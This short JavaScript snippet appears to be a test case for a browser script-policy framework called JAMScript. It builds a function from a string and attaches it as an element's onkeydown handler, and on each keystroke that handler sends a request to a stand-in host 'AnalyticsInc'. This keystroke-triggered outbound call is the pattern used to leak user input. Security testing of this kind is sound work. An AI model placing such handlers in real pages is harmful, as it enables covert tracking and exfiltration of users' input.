var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeydown3", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
var v1 = JAMScript.call(Function, null, [exp]);
JAMScript.set(v0, "onkeydown", v1);

